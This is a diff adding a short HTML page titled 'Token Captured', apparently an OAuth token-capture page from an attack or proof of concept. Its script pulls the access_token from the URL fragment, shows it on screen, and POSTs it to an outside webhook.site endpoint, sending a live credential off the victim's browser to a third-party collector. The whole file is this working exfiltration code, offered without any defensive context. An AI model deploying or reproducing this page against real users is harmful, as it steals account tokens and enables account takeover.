@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Token Captured</title>
+</head>
+<body>
+  <h2>Processing...</h2>
+  <script>
+    const hash = window.location.hash.substring(1);
+    const token = new URLSearchParams(hash).get("access_token");
+
+    if (token) {
+      document.body.innerHTML = "<h2>✅ Token Captured!</h2><p>" + token + "</p>";
+
+      // Send it to webhook.site so you can view it
+      fetch("https://webhook.site/3b98c118-cca2-4303-9da8-ae30e2bb1fd1", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: token })
+      });
+    } else {
+      document.body.innerHTML = "<h2>❌ No token found.</h2>";
+    }
+  </script>
+</body>
+</html>
